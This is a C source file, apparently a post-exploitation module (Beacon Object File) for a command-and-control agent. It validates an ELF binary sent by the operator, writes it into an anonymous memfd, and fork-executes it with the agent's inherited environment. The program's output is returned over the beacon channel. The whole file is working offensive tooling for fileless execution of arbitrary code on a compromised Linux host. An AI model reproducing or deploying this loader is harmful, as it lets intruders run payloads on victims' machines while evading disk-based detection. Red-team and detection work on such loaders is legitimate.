//   bytes:elf_raw   — ELF binary bytes (with 4-byte length prefix)
//   cstr:params     — space-separated arguments


#include "bof_api.h"

#ifndef SYS_memfd_create
# define SYS_memfd_create 319
#endif

#define MFD_CLOEXEC  1U
#define MAX_ARGS     32
#define READ_CHUNK   4096
#define OUTPUT_MAX   (2 * 1024 * 1024)

/* ── ELF structures (inline — no system headers needed in BOF) ── */

#define ELF_MAGIC       "\x7f""ELF"
#define ET_EXEC         2
#define ET_DYN          3
#define EM_386          3
#define EM_ARM          40
#define EM_X86_64       62
#define EM_AARCH64      183
#define ELFCLASS32      1
#define ELFCLASS64      2
#define ELFDATA2LSB     1   /* little-endian */
#define ELFDATA2MSB     2   /* big-endian */
#define PT_LOAD         1
#define PT_INTERP       3
#define PT_GNU_STACK    0x6474e551

typedef unsigned char  u8;
typedef unsigned short u16;
typedef unsigned int   u32;
typedef unsigned long long u64;

/* ELF64 header */
typedef struct {
    u8  e_ident[16];
    u16 e_type;
    u16 e_machine;
    u32 e_version;
    u64 e_entry;
    u64 e_phoff;
    u64 e_shoff;
    u32 e_flags;
    u16 e_ehsize;
    u16 e_phentsize;
    u16 e_phnum;
    u16 e_shentsize;
    u16 e_shnum;
    u16 e_shstrndx;
} Elf64_Ehdr;

/* ELF32 header */
typedef struct {
    u8  e_ident[16];
    u16 e_type;
    u16 e_machine;
    u32 e_version;
    u32 e_entry;
    u32 e_phoff;
    u32 e_shoff;
    u32 e_flags;
    u16 e_ehsize;
    u16 e_phentsize;
    u16 e_phnum;
    u16 e_shentsize;
    u16 e_shnum;
    u16 e_shstrndx;
} Elf32_Ehdr;

/* ELF64 program header */
typedef struct {
    u32 p_type;
    u32 p_flags;
    u64 p_offset;
    u64 p_vaddr;
    u64 p_paddr;
    u64 p_filesz;
    u64 p_memsz;
    u64 p_align;
} Elf64_Phdr;

/* ELF32 program header */
typedef struct {
    u32 p_type;
    u32 p_offset;
    u32 p_vaddr;
    u32 p_paddr;
    u32 p_filesz;
    u32 p_memsz;
    u32 p_flags;
    u32 p_align;
} Elf32_Phdr;

/* ── Helpers ── */

static void close_fd(int fd) {
    if (fd >= 0) AxCloseFile(fd);
}

static const char *elf_machine(u16 m) {
    switch (m) {
        case EM_386:     return "x86 (i386)";
        case EM_ARM:     return "ARM (32-bit)";
        case EM_X86_64:  return "x86-64";
        case EM_AARCH64: return "ARM64 (AArch64)";
        default:         return "Unknown";
    }
}

static const char *elf_type(u16 t) {
    switch (t) {
        case ET_EXEC: return "Executable";
        case ET_DYN:  return "Shared object / PIE";
        default:      return "Other";
    }
}

static const char *elf_endian(u8 d) {
    switch (d) {
        case ELFDATA2LSB: return "Little-endian";
        case ELFDATA2MSB: return "Big-endian";
        default:          return "Unknown";
    }
}

/* ── ELF validation and metadata ── */

static int print_elf_metadata(const char *data, int len) {
    if (len < 16) {
        BeaconPrintf(CALLBACK_ERROR, "[!] load_elf: file too small (%d bytes)\n", len);
        return -1;
    }

    /* Magic check */
    if (data[0] != 0x7f || data[1] != 'E' || data[2] != 'L' || data[3] != 'F') {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] load_elf: invalid ELF magic (got %02x %02x %02x %02x)\n",
            (u8)data[0], (u8)data[1], (u8)data[2], (u8)data[3]);
        return -1;
    }

    u8 class   = (u8)data[4];
    u8 endian  = (u8)data[5];
    u8 elfver  = (u8)data[6];
    u8 osabi   = (u8)data[7];

    /* OS/ABI must be Linux (0x00) or GNU/Linux (0x03) */
    if (osabi != 0x00 && osabi != 0x03) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] load_elf: not a Linux ELF (OS/ABI=0x%02x, expected 0x00 or 0x03)\n", osabi);
        return -1;
    }

    /* Only support little-endian */
    if (endian != ELFDATA2LSB) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] load_elf: big-endian ELF not supported\n");
        return -1;
    }

    if (elfver != 1) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] load_elf: unknown ELF version (%d)\n", elfver);
        return -1;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] load_elf: ── ELF Metadata ─────────────────────\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] load_elf:   File size    : %d bytes\n", len);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] load_elf:   Class        : ELF%d\n", class == ELFCLASS64 ? 64 : 32);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] load_elf:   Endianness   : %s\n", elf_endian(endian));
    BeaconPrintf(CALLBACK_OUTPUT, "[*] load_elf:   OS/ABI       : 0x%02x (%s)\n",
                 osabi, osabi == 0x03 ? "GNU/Linux" : "System V");

    if (class == ELFCLASS64) {
        if (len < (int)sizeof(Elf64_Ehdr)) {
            BeaconPrintf(CALLBACK_ERROR, "[!] load_elf: file too small for ELF64 header\n");
            return -1;
        }
        const Elf64_Ehdr *eh = (const Elf64_Ehdr *)data;

        if (eh->e_type != ET_EXEC && eh->e_type != ET_DYN) {
            BeaconPrintf(CALLBACK_ERROR,
                "[!] load_elf: not an executable (type=0x%04x)\n", eh->e_type);
            return -1;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "[*] load_elf:   Type         : %s\n", elf_type(eh->e_type));
        BeaconPrintf(CALLBACK_OUTPUT, "[*] load_elf:   Architecture : %s\n", elf_machine(eh->e_machine));
        BeaconPrintf(CALLBACK_OUTPUT, "[*] load_elf:   Entry point  : 0x%llx\n", (unsigned long long)eh->e_entry);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] load_elf:   Program hdrs : %d\n", eh->e_phnum);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] load_elf:   Section hdrs : %d\n", eh->e_shnum);

        /* Walk program headers */
        if (eh->e_phnum > 0 && eh->e_phoff > 0 &&
            (int)(eh->e_phoff + eh->e_phnum * sizeof(Elf64_Phdr)) <= len) {

            u64 vaddr_min = (u64)-1, vaddr_max = 0;
            int load_count = 0;
            int has_interp = 0;
            int nx_stack   = 1; /* assume NX unless GNU_STACK has exec */

            const Elf64_Phdr *ph = (const Elf64_Phdr *)(data + eh->e_phoff);
            for (int i = 0; i < eh->e_phnum; i++) {
                if (ph[i].p_type == PT_LOAD) {
                    load_count++;
                    if (ph[i].p_vaddr < vaddr_min) vaddr_min = ph[i].p_vaddr;
                    u64 end = ph[i].p_vaddr + ph[i].p_memsz;
                    if (end > vaddr_max) vaddr_max = end;
                    BeaconPrintf(CALLBACK_OUTPUT,
                        "[*] load_elf:   LOAD[%d]      : vaddr=0x%llx  memsz=0x%llx  flags=%c%c%c\n",
                        load_count - 1,
                        (unsigned long long)ph[i].p_vaddr,
                        (unsigned long long)ph[i].p_memsz,
                        (ph[i].p_flags & 4) ? 'R' : '-',
                        (ph[i].p_flags & 2) ? 'W' : '-',
                        (ph[i].p_flags & 1) ? 'X' : '-');
                } else if (ph[i].p_type == PT_INTERP) {
                    has_interp = 1;
                    if ((int)(ph[i].p_offset + ph[i].p_filesz) <= len) {
                        BeaconPrintf(CALLBACK_OUTPUT,
                            "[*] load_elf:   Interpreter  : %s\n",
                            data + (int)ph[i].p_offset);
                    }
                } else if (ph[i].p_type == PT_GNU_STACK) {
                    if (ph[i].p_flags & 1) nx_stack = 0;
                }
            }

            if (vaddr_min != (u64)-1) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "[*] load_elf:   Load range   : 0x%llx – 0x%llx  (%llu KB)\n",
                    (unsigned long long)vaddr_min,
                    (unsigned long long)vaddr_max,
                    (unsigned long long)((vaddr_max - vaddr_min + 1023) / 1024));
            }
            BeaconPrintf(CALLBACK_OUTPUT, "[*] load_elf:   LOAD segments: %d\n", load_count);
            BeaconPrintf(CALLBACK_OUTPUT, "[*] load_elf:   Dynamic link : %s\n", has_interp ? "yes" : "static");
            BeaconPrintf(CALLBACK_OUTPUT, "[*] load_elf:   NX stack     : %s\n", nx_stack ? "yes" : "NO (executable stack)");
        }

    } else if (class == ELFCLASS32) {
        if (len < (int)sizeof(Elf32_Ehdr)) {
            BeaconPrintf(CALLBACK_ERROR, "[!] load_elf: file too small for ELF32 header\n");
            return -1;
        }
        const Elf32_Ehdr *eh = (const Elf32_Ehdr *)data;

        if (eh->e_type != ET_EXEC && eh->e_type != ET_DYN) {
            BeaconPrintf(CALLBACK_ERROR,
                "[!] load_elf: not an executable (type=0x%04x)\n", eh->e_type);
            return -1;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "[*] load_elf:   Type         : %s\n", elf_type(eh->e_type));
        BeaconPrintf(CALLBACK_OUTPUT, "[*] load_elf:   Architecture : %s\n", elf_machine(eh->e_machine));
        BeaconPrintf(CALLBACK_OUTPUT, "[*] load_elf:   Entry point  : 0x%x\n", eh->e_entry);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] load_elf:   Program hdrs : %d\n", eh->e_phnum);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] load_elf:   Section hdrs : %d\n", eh->e_shnum);

        if (eh->e_phnum > 0 && eh->e_phoff > 0 &&
            (int)(eh->e_phoff + eh->e_phnum * sizeof(Elf32_Phdr)) <= len) {

            u32 vaddr_min = (u32)-1, vaddr_max = 0;
            int load_count = 0;
            int has_interp = 0;
            int nx_stack   = 1;

            const Elf32_Phdr *ph = (const Elf32_Phdr *)(data + eh->e_phoff);
            for (int i = 0; i < eh->e_phnum; i++) {
                if (ph[i].p_type == PT_LOAD) {
                    load_count++;
                    if (ph[i].p_vaddr < vaddr_min) vaddr_min = ph[i].p_vaddr;
                    u32 end = ph[i].p_vaddr + ph[i].p_memsz;
                    if (end > vaddr_max) vaddr_max = end;
                    BeaconPrintf(CALLBACK_OUTPUT,
                        "[*] load_elf:   LOAD[%d]      : vaddr=0x%x  memsz=0x%x  flags=%c%c%c\n",
                        load_count - 1,
                        ph[i].p_vaddr, ph[i].p_memsz,
                        (ph[i].p_flags & 4) ? 'R' : '-',
                        (ph[i].p_flags & 2) ? 'W' : '-',
                        (ph[i].p_flags & 1) ? 'X' : '-');
                } else if (ph[i].p_type == PT_INTERP) {
                    has_interp = 1;
                    if ((int)(ph[i].p_offset + ph[i].p_filesz) <= len) {
                        BeaconPrintf(CALLBACK_OUTPUT,
                            "[*] load_elf:   Interpreter  : %s\n",
                            data + (int)ph[i].p_offset);
                    }
                } else if (ph[i].p_type == PT_GNU_STACK) {
                    if (ph[i].p_flags & 1) nx_stack = 0;
                }
            }

            if (vaddr_min != (u32)-1) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "[*] load_elf:   Load range   : 0x%x – 0x%x  (%u KB)\n",
                    vaddr_min, vaddr_max,
                    (vaddr_max - vaddr_min + 1023) / 1024);
            }
            BeaconPrintf(CALLBACK_OUTPUT, "[*] load_elf:   LOAD segments: %d\n", load_count);
            BeaconPrintf(CALLBACK_OUTPUT, "[*] load_elf:   Dynamic link : %s\n", has_interp ? "yes" : "static");
            BeaconPrintf(CALLBACK_OUTPUT, "[*] load_elf:   NX stack     : %s\n", nx_stack ? "yes" : "NO (executable stack)");
        }

    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] load_elf: unknown ELF class (%d)\n", class);
        return -1;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] load_elf: ─────────────────────────────────────\n");
    return 0;
}

/* ── Environment ── */

static char **get_all_env(int *env_count) {
    char **envp = NULL;
    int count = 0;
    int fd = AxOpenFile("/proc/self/environ", 0, 0);
    if (fd < 0) { *env_count = 0; return NULL; }

    char *env_data = (char *)AxMalloc(64 * 1024);
    if (!env_data) { close_fd(fd); *env_count = 0; return NULL; }

    int total = 0, n;
    while (total < 64 * 1024 - 1) {
        n = AxReadFile(fd, env_data + total, 64 * 1024 - total - 1);
        if (n <= 0) break;
        total += n;
    }
    close_fd(fd);
    env_data[total] = '\0';

    int i = 0;
    while (i < total && count < 128) {
        if (env_data[i] != '\0') {
            count++;
            while (i < total && env_data[i] != '\0') i++;
        }
        i++;
    }

    if (count == 0) { AxFree(env_data); *env_count = 0; return NULL; }

    envp = (char **)AxMalloc((count + 1) * sizeof(char *));
    if (!envp) { AxFree(env_data); *env_count = 0; return NULL; }

    int idx = 0; i = 0;
    while (i < total && idx < count) {
        if (env_data[i] != '\0') {
            envp[idx++] = env_data + i;
            while (i < total && env_data[i] != '\0') i++;
        }
        i++;
    }
    envp[idx] = NULL;
    *env_count = count;
    return envp;
}



static void parse_params(char *params, char **argv_buf, int *argc, int max_args) {
    if (!params || !argv_buf || !argc) return;
    while (*params == ' ') params++;
    while (*params && *argc < max_args) {
        argv_buf[(*argc)++] = params;
        while (*params && *params != ' ') params++;
        if (*params == ' ') {
            *params = '\0';
            params++;
            while (*params == ' ') params++;
        }
    }
}

/* ── Entry point ── */

void go(char *args, int args_len) {

    datap dp;
    BeaconDataParse(&dp, args, args_len);

    /* ELF bytes */
    int   elf_len  = 0;
    char *elf_data = BeaconDataExtract(&dp, &elf_len);
    if (!elf_data || elf_len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] load_elf: missing ELF data\n");
        return;
    }

    /* Validate ELF and print metadata — abort if invalid */
    if (print_elf_metadata(elf_data, elf_len) != 0)
        return;

    /* Optional params string */
    int   params_len = 0;
    char *params     = BeaconDataExtract(&dp, &params_len);

    char *argv_buf[MAX_ARGS + 2];
    int   argc = 0;
    argv_buf[argc++] = "load_elf";
    if (params && params_len > 0)
        parse_params(params, argv_buf, &argc, MAX_ARGS);
    argv_buf[argc] = NULL;

    /* Inherit environment from agent process */
    int env_count = 0;
    char **envp = get_all_env(&env_count);

    /* Write ELF to anonymous memfd */
    int memfd = AxMemfdCreate("", MFD_CLOEXEC);
    if (memfd < 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] load_elf: memfd_create failed (errno=%d)\n", AxGetErrno());
        return;
    }

    int written = 0;
    while (written < elf_len) {
        int n = AxWriteFile(memfd, elf_data + written, elf_len - written);
        if (n <= 0) {
            BeaconPrintf(CALLBACK_ERROR, "[!] load_elf: write to memfd failed (errno=%d)\n", AxGetErrno());
            close_fd(memfd);
            return;
        }
        written += n;
    }

    int pfd[2] = {-1, -1};
    if (AxPipe(pfd) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] load_elf: pipe() failed (errno=%d)\n", AxGetErrno());
        close_fd(memfd);
        if (envp) AxFree(envp);
        return;
    }

    int pid = AxFork();
    if (pid < 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] load_elf: fork() failed (errno=%d)\n", AxGetErrno());
        close_fd(pfd[0]); close_fd(pfd[1]); close_fd(memfd);
        if (envp) AxFree(envp);
        return;
    }

    if (pid == 0) {
        /* Child: redirect stdout+stderr → pipe, exec ELF */
        close_fd(pfd[0]);
        AxDup2(pfd[1], 1);
        AxDup2(pfd[1], 2);
        if (pfd[1] != 1 && pfd[1] != 2) close_fd(pfd[1]);

        char *empty_env[] = { NULL };
        char *const *exec_env = envp ? (char *const *)envp : (char *const *)empty_env;

        AxFexecve(memfd, (char *const *)argv_buf, exec_env);

        /* fexecve failed — try /proc/self/fd/<n> fallback */
        char fdpath[64];
        AxSnprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", memfd);
        AxExecve(fdpath, (char *const *)argv_buf, exec_env);

        /* both failed */
        char errbuf[64];
        int n = AxSnprintf(errbuf, sizeof(errbuf),
                           "[!] load_elf: exec failed (errno=%d)\n", AxGetErrno());
        AxWriteFile(1, errbuf, n);
        AxExit(1);
    }

    /* Parent */
    close_fd(pfd[1]);
    close_fd(memfd);
    if (envp) AxFree(envp);

    char *output = (char *)AxMalloc(OUTPUT_MAX + 1);
    if (!output) {
        BeaconPrintf(CALLBACK_ERROR, "[!] load_elf: output buffer alloc failed\n");
        AxWaitpid(pid, NULL, 0);
        close_fd(pfd[0]);
        return;
    }

    int total = 0;
    while (total < OUTPUT_MAX) {
        int n = AxReadFile(pfd[0], output + total, READ_CHUNK);
        if (n <= 0) break;
        total += n;
    }
    close_fd(pfd[0]);

    int status = 0;
    AxWaitpid(pid, &status, 0);

    if (total > 0) {
        output[total] = '\0';
        BeaconOutput(CALLBACK_OUTPUT, output, total);
    }

    int sig  = status & 0x7F;
    int code = (sig == 0) ? (status >> 8) & 0xFF : -1;

    if (sig != 0)
        BeaconPrintf(CALLBACK_OUTPUT, "[!] load_elf: child killed by signal %d\n", sig);
    else if (code != 0)
        BeaconPrintf(CALLBACK_OUTPUT, "[*] load_elf: exited with code %d\n", code);

    AxFree(output);
}
